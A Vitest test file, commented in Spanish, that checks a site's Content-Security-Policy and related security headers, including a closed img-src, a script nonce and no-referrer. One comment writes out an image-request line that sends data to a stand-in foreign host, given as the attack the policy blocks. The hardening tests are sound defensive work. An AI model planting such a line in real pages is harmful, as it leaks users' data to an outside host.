import { describe, expect, it } from 'vitest'
import { CABECERAS_ESTATICAS, construirCsp, esRutaDeTarjeta } from '@/shared/seguridad/headers'

describe('candados de cabecera (unidad 1e)', () => {
  const csp = construirCsp('abc123', false)

  it('la CSP arranca en default-src self: deny by default', () => {
    expect(csp.startsWith("default-src 'self'")).toBe(true)
  })

  it('no deja ningun origen remoto abierto, ni siquiera por img-src', () => {
    // El vector concreto: new Image().src = 'https://ajeno/?d=' + datos. No lo gobiernan
    // script-src ni connect-src, solo el deny by default mas un img-src cerrado.
    expect(csp).toContain("img-src 'self' data: blob:")
    expect(csp).not.toMatch(/(^|[ ;])(\*|https?:)(\s|;|$)/)
  })

  it('lleva el nonce en script-src', () => {
    expect(csp).toContain("'nonce-abc123'")
  })

  it('en desarrollo agrega unsafe-eval y en produccion no', () => {
    expect(construirCsp('x', true)).toContain("'unsafe-eval'")
    expect(csp).not.toContain("'unsafe-eval'")
  })

  it('Referrer-Policy es no-referrer, no el de la landing', () => {
    const rp = CABECERAS_ESTATICAS.find((c) => c.key === 'Referrer-Policy')
    expect(rp?.value).toBe('no-referrer')
  })

  it('reconoce las rutas de tarjeta y deja la home fuera', () => {
    expect(esRutaDeTarjeta('/t')).toBe(true)
    expect(esRutaDeTarjeta('/editor')).toBe(true)
    expect(esRutaDeTarjeta('/tarjeta/algo')).toBe(true)
    expect(esRutaDeTarjeta('/')).toBe(false)
    expect(esRutaDeTarjeta('/terminos')).toBe(false)
  })
})
